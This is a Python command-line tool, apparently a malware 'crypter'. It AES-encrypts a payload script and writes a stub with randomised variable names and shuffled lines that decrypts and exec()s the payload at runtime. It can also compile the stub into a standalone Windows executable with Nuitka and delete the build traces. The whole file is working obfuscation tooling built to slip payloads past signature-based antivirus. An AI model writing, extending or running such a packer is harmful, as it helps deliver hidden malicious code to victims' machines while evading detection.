import typer
import numpy as np
import base64
import subprocess
import os
import shutil

from Cryptodome.Cipher import AES

from console import ERROR_CONSOLE, SUCCESS_CONSOLE, CONSOLE
from utils import get_file, generate_key, generate_random_variable

app = typer.Typer()


@app.command()
def main(payload_path: str, save_path: str, compile_payload: bool):
    if encrypt_payload(payload_path, save_path) is None:
        return

    if compile_payload:
        compile_encrypted_payload(save_path)


def encrypt_payload(payload_path: str, save_path: str) -> bool | None:
    """
    Generates a random key, creates random variable names for the decryption header
    program and encrypts the payload with AES in CBC mode
    """
    payload = get_file(payload_path)

    if payload is None:
        return

    key = generate_key()
    variables = [generate_random_variable(np.random.randint(5, 16)) for i in range(5)]

    cipher = AES.new(key, AES.MODE_CBC)
    padded_payload = payload + ("\n" * ((16 - len(payload)) % 16))
    encrypted_payload = cipher.encrypt(padded_payload.encode())

    try:
        with open(save_path, "w") as f:
            header_lines = ["import base64"]
            lines = [
                f"from Cryptodome.Cipher import AES",
                f'{variables[0]} = base64.b64decode("{base64.b64encode(key).decode()}")',
                f'{variables[1]} = base64.b64decode("{base64.b64encode(encrypted_payload).decode()}")',
                f'{variables[2]} = base64.b64decode("{base64.b64encode(cipher.iv).decode()}")',
            ]
            footer_lines = [
                f"{variables[3]} = AES.new({variables[0]}, AES.MODE_CBC, {variables[2]})",
                f"{variables[4]} = {variables[3]}.decrypt({variables[1]}).decode()",
                # f'print({variables[4]})',
                f"exec({variables[4]})",
            ]
            np.random.shuffle(lines)

            f.write("\n".join(header_lines + lines + footer_lines))
    except FileNotFoundError:
        ERROR_CONSOLE.print("Could not write encrypted payload to disk!")
        return None

    SUCCESS_CONSOLE.print(f"Successfully encrypted {payload_path} to {save_path}!")

    return True


def compile_encrypted_payload(payload_path: str):
    """
    Compiles the payload into a windows executeable
    """
    success = True
    with subprocess.Popen(
        ["python3", "-m", "nuitka", payload_path, "--standalone", "--onefile"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    ) as proc:
        for line in proc.stdout:
            CONSOLE.print(line, end='')

        stdout, stderr = proc.communicate()

        if "No module named nuitka" in stderr:
            success = False
            
    if not success:
        subprocess.run(
            [
                "python",
                "-m",
                "nuitka",
                payload_path,
                "--standalone",
                "--onefile",
            ]
        )

    CONSOLE.print("Removing build folders and encrypted payload...")
    os.remove(payload_path)
    shutil.rmtree(payload_path[:-3] + ".build")
    shutil.rmtree(payload_path[:-3] + ".onefile-build")
    shutil.rmtree(payload_path[:-3] + ".dist")

    SUCCESS_CONSOLE.print(f"Successfully compiled payload to {payload_path[:-3] + '.exe'}!")


if __name__ == "__main__":
    app()
    # main("test_payload.py", "test_enc.py", True)
